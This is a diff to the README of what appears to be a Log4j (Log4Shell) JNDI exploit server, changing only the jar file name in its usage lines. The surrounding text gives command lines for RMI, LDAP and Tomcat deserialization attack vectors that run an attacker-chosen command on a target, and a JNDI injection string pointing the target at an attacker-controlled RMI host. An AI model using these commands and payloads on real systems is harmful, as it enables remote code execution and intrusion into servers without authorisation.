@@ -20,7 +20,7 @@ Requires Java 1.8+ and Maven 3.x+
 
 ### 1.RMI Attack Vector
 
-`java -jar Log4j-JNDIServer.jar 1 <RMI_IP> <RMI_PORT> <HTTP_PORT> <COMMAND>`
+`java -jar Log4j-JNDIServer-1.0-SNAPSHOT-all.jar 1 <RMI_IP> <RMI_PORT> <HTTP_PORT> <COMMAND>`
 
 You don't need to host the Exploit.class anymore. The app will start an HTTP server on the indicated port.
 
@@ -30,7 +30,7 @@ You must indicate the command you want to run in the target.
 
 ### 2.LDAP Attack Vector
 
-`java -jar Log4j-JNDIServer.jar 2 <LDAP_IP> <LDAP_PORT> <HTTP_PORT> <COMMAND>`
+`java -jar Log4j-JNDIServer-1.0-SNAPSHOT-all.jar 2 <LDAP_IP> <LDAP_PORT> <HTTP_PORT> <COMMAND>`
 
 You don't need to host the Exploit.class anymore. The app will start an HTTP server on the indicated port.
 
@@ -40,7 +40,7 @@ You must indicate the command you want to run in the target.
 
 ### 3.Deserialization Attack Vector (Using Tomcat payload)
 
-`java -jar Log4j-JNDIServer.jar 3 <RMI_IP> <RMI_PORT> <COMMAND>`
+`java -jar Log4j-JNDIServer-1.0-SNAPSHOT-all.jar 3 <RMI_IP> <RMI_PORT> <COMMAND>`
 
 `Injection: {jndi:rmi://<RMI_IP>:<RMI_PORT>/Foo}`
 
